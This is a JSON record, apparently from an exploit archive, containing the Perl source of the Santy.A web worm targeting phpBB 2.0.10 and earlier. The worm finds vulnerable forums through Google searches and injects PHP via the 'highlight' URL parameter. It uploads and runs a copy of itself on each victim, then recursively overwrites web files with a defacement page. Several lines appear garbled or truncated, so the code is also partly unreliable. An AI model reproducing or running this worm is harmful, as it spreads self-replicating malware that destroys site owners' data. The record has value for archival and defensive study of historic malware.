{
  "id": "702",
  "title": "phpBB &lt; 2.0.10 - &#039;Santy.A Worm&#039; &#039;highlight&#039; Arbitrary File Upload",
  "cve": null,
  "vuln_type": "rce",
  "code": "#\r\n# Santy.A - phpBB <= 2.0.10 Web Worm Source Code (Proof of Concept)\r\n# -SECU For educational purpose\r\n#\r\n# See : http://isc.sans.org/diary.php?date=2004-12-21\r\n# http://www.f-secure.com/v-descs/santy_a.shtml\r\n#\r\n#!/usr/bin/perl\r\nuse\r\nstrict;\r\nuse Socket;\r\n\r\nsub PayLoad();\r\nsub DoDir($);\r\nsub DoFile ($);\r\nsub GoGoogle();\r\n\r\nsub GrabURL($);\r\nsub str2chr($);\r\n\r\neval{ fork and exit; };\r\n\r\nmy $generation = x;\r\nPayLoad() if $generation > 3;\r\n\r\nopen IN, $0 or exit;\r\nmy $self = join '', <IN>;\r\nclose IN;\r\nunlink $0;\r\n\r\nwhile(!GrabURL('http://www.google.com/advanced_search')) {\r\nif($generation > 3)\r\n{\r\nPayLoad() ;\r\n} else {\r\nexit;\r\n}\r\n}\r\n\r\n$self =~ s/my \\$generation = (\\d+);/'my $generation = ' . ($1 + 1) . ';'/e;\r\n\r\nmy $selfFileName = 'm1ho2of';\r\nmy $markStr = 'HYv9po4z3jjHWanN';\r\nmy $perlOpen = 'perl -e \"open OUT,q(>' . $selfFileName . ') and print q(' . $markStr . ')\"';\r\nmy $tryCode = '&highlight=%2527%252Esystem(' . str2chr($perlOpen) . ')%252e%2527';\r\n\r\nwhile(1) {\r\nexit if -e 'stop.it';\r\n\r\nOUTER: for my $url (GoGoogle()) {\r\n\r\nexit if -e 'stop.it';\r\n\r\n$url =~ s/&highlight=.*$//;\r\n$url .= $tryCode;\r\nmy $r = GrabURL($url);\r\nnext unless defined $r;\r\nnext unless $r =~ /$markStr/;\r\n\r\nwhile($self =~ /(.{1,20})/gs) {\r\nmy $portion = '&highlight=%2527%252Efwrite(fopen(' . str2chr($selfFileName) . ',' . str2chr('a') . '),\r\n' . str2chr($1) . '),exit%252e%2527';\r\n\r\n$url =~ s/&highlight=.*$//;\r\n$url .= $portion;\r\n\r\nnext OUTER unless GrabURL($url);\r\n}\r\n\r\nmy $syst = '&highlight=%2527%252Esystem(' . str2chr('perl ' . $selfFileName) . ')%252e%2527';\r\n$url =~ s/&highlight=.*$//;\r\n$url .= $syst;\r\n\r\nGrabURL($url);\r\n}\r\n}\r\n\r\n\r\n\r\nsub str2chr($) {\r\nmy $s = shift;\r\n\r\n$s =~ s/(.)/'chr(' . or d($1) . ')%252e'/seg;\r\n$s =~ s/%252e$//;\r\n\r\nreturn $s;\r\n}\r\n\r\n\r\nsub GoGoogle() {\r\nmy @urls;\r\nmy @ts = qw/t p topic/;\r\nmy $startURL = 'http://www.google.com/search?num=100&hl=en&lr=&as_qdr=all' . '&\r\nq=allinurl%3A+%22viewtopic.php%22+%22' . $ts[int(rand(@ts))] . '%3D' . int(rand(30000)) .\r\n'%22&btnG=Search';\r\nmy $goo1st = GrabURL($startURL)\r\nfined $goo1st;\r\nmy $allGoo = $goo1st;\r\nmy $r = '<td><a href=(/search\\?q=.+?)' . '><img src=/nav_page\\.gif width=16 height=26\r\nalt=\"\" border=0><br>\\d+</a>';\r\nwhile($goo1st =~ m#$r#g) {\r\n$allGoo . = GrabURL('www.google.com' . $1);\r\n}\r\nwhile($allGoo =~ m#href=(http://\\S+viewtopic.php\\S+)#g) {\r\nmy $u = $1;\r\nnext if $u =~ m#http://.*http://#i; # no redirects\r\npush(@urls, $u);\r\n}\r\n\r\nreturn @urls;\r\n}\r\n\r\n\r\nsub GrabURL($) {\r\nmy $url = shift;\r\n$url =~ s#^http://##i;\r\n\r\nmy ($host, $res) = $url =~ m#^(.+?)(/.*)#;\r\nreturn unless defined($host) && defined($res);\r\n\r\nmy $r =\r\n\"GET $resHTTP/1.0\\015\\012\" .\r\n\"Host: $host\\015\\012\" .\r\n\"Accept:*/*\\015\\012\" .\r\n\"Accept-Language: en-us,en-gb;q=0.7,en;q=0.3\\015\\012\" .\r\n\"Pragma: no-cache\\015\\012\" .\r\n\"Cache-Control: no-cache\\015\\012\" .\r\n\"Referer: http://\" . $host . $res . \"\\015\\012\" .\r\n\r\n\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\015\\012\" .\r\n\"Connection: close\\015\\012\\015\\012\";\r\n\r\nmy $port = 80;\r\nif($host =~ /(.*):(\\d+)$/){ $host = $1; $port = $2;}\r\n\r\nmy $internet_addr = inet_aton($host) or return;\r\nsocket(Server, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or return;\r\nsetsockopt(Server, SOL_SOCKET, SO_RCVTIMEO, 10000);\r\n\r\nconnect(Server, sockaddr_in($port, $internet_addr)) or return;\r\nselect((select(Server), $| = 1)[0]);\r\nprint Server $r;\r\n\r\nmy $answer = join '', <Server>;\r\nclose (Server);\r\n\r\nreturn $answer;\r\n}\r\n\r\n\r\nsub DoFile($) {\r\nmy $s = q{\r\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\r\n<HTML><HEAD><TITLE>This site is defaced!!!</TITLE></HEAD>\r\n<BODY bgcolor=\"#000000\" text=\"#FF0000\">\r\n<H1>This site is defaced!!!</H1>\r\n<HR><ADDRESS><b>NeverEverNoSanity WebWorm generation }\r\n. $generation .q{.</b></ADDRESS>\r\n</BODY></HTML>\r\n};\r\n\r\nunlink $_[0];\r\nopen OUT, \">$_[0]\" or return;\r\nprint OUT $s;\r\nclose OUT;\r\n}\r\n\r\n\r\nsub DoDir($) {\r\n\r\nmy $dir = $_[0];\r\n$dir .= '/' unless $dir =~ m#/$#;\r\n\r\nlocal *DIR;\r\nopendir DIR, $dir or return;\r\n\r\nfor my $ent (grep { $_ ne '.' and $_ ne '..' } readdir DIR) {\r\n\r\nunless(-l $dir . $ent) {\r\nif(-d _) {\r\nDoDir($dir . $ent);\r\nnext;\r\n}\r\n}\r\n\r\nif($ent =~ /\\.htm/i or $ent =~ /\\.php/i or $ent =~ /\\.asp/i or $ent =~ /\\.shtm/i or $ent =~ /\\.jsp/i\r\nor $ent =~ /\\.phtm/i) {\r\nDoFile($dir . $ent);\r\n}\r\n}\r\n\r\nclosedir DIR;\r\n}\r\n\r\n\r\nsub Pay Load() {\r\n\r\nmy @dirs;\r\n\r\n\r\neval{\r\nwhile(my @a = getpwent()) { push(@dirs, $a[7]);}\r\n};\r\n\r\npush(@dirs, '/ ');\r\n\r\nfor my $l ('A' .. 'Z') {\r\npush(@d\r\nfor my $d (@dirs) {\r\nDoDir($d);\r\n}\r\n}\r\n\r\n# milw0rm.com [2004-12-22]",
  "url": "https://www.exploit-db.com/exploits/702"
}